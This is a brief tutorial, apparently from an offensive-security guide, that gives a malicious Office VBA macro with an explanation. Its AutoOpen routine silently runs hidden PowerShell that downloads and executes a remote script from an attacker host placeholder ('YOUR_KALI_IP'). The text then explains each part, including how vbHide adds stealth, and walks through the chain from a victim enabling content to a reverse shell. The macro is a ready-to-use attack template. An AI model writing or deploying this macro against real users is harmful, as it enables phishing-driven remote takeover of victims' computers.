Example: Malicious VBA Macro
Sub AutoOpen()
    Call Shell("cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://YOUR_KALI_IP/shell.ps1'))", vbHide)
End Sub

`Sub AutoOpen()`: This subroutine automatically executes when the document is opened.

`Call Shell(...)`: Executes a system command. Here, it launches `cmd.exe` to run a PowerShell command.

`powershell.exe -nop -w hidden -c IEX (...)`: Downloads and executes a remote PowerShell script from `YOUR_KALI_IP`.

`vbHide`: Hides the command prompt window, making the execution stealthier.

How it Works

Macro Execution Chain

1. Document Opened: Victim opens the macro-enabled Office document.

2. Macros Enabled: Victim clicks 'Enable Content', allowing `AutoOpen()` to run.

3. PowerShell Execution: `Call Shell` executes the PowerShell command, downloading `shell.ps1`.

4. Reverse Shell: The downloaded script establishes a reverse shell to the attacker.
